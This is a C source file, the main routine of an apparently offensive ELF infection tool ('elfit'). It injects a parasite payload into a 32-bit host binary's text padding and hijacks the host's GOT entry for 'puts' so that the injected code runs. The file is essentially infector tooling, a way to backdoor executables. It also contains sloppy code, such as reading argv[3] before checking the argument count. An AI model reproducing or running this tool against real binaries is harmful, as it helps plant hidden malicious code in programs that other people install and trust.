#include "elfit.h"

/* currently just a wrapper for posttext inject */
int main(int argc, char *argv[])
{
    opts_t *opts;
    unsigned long entry;
    uint32_t patch_position;
    Elfit_t host;
    Elf32_Addr got;

    patch_position = atoi(argv[3]);

    /*
    if (argc < 4)
    {
        printf("usage: %s <host> <parasite> <patch_position>\n", argv[0]);
        exit(1);
    }
    */
    if ((opts = usage(argc, argv)) == NULL)
    {
        exit(-1);
    }
    opts_debug(opts);

    /* TODO Integrity check host for section header table */

    load_host(opts->host, &host);

    /* PATCH TO (ENTRY [NULL], X) */
    entry = textpadding_inject_32(&host, opts->parasite, opts->patch_pos, opts->patch_addr);
    reload_host(opts->host, &host);
    
    //entry_redirect_32(&host, entry);

    if ((got = got_redirect_32(&host, "puts", entry)) == -1)
    {
        printf("Couldn't find symbol\n");
        exit(-1);
    }
}
